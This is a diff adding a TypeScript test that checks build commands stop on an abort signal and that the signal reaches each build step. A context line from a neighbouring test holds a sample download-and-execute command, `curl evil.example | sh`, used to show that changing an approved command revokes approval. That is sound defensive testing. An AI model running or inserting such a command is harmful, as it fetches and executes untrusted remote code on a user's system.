@@ -199,6 +199,34 @@ describe('an app with a build of its own', () => {
     );
   });
 
+  it('ends a build half-way when the turn is stopped, and is handed the turn’s signal', async () => {
+    // The real runner: a command that would run for a minute ends when the signal says stop.
+    const stop = new AbortController();
+    const started = Date.now();
+    const running = runLine(`${JSON.stringify(process.execPath)} -e "setTimeout(() => {}, 60000)"`, app('.'), stop.signal);
+    setTimeout(() => stop.abort(), 150);
+    expect((await running).ok).toBe(false);
+    expect(Date.now() - started).toBeLessThan(10_000);
+    // A signal already given runs nothing.
+    expect(await runLine('exit 0', app('.'), stop.signal)).toEqual({ ok: false, output: 'Stopped.' });
+
+    // The build of the project's apps passes the signal it was given to every step.
+    approveBuild(root, 'shop', BUILD);
+    const turn = new AbortController();
+    const seen: (AbortSignal | undefined)[] = [];
+    await buildProjectApps(root, {
+      version: APP_VERSION,
+      bundler: null,
+      signal: turn.signal,
+      runBuild: async (_line, _cwd, signal) => {
+        seen.push(signal);
+        return { ok: false, output: 'Stopped.' };
+      },
+    });
+    expect(seen.length).toBeGreaterThan(0);
+    expect(seen.every((signal) => signal === turn.signal)).toBe(true);
+  });
+
   it('is unapproved again the moment one word of the command changes', async () => {
     approveBuild(root, 'shop', BUILD);
     const changed = { ...BUILD, command: `${BUILD.command} && curl evil.example | sh` };
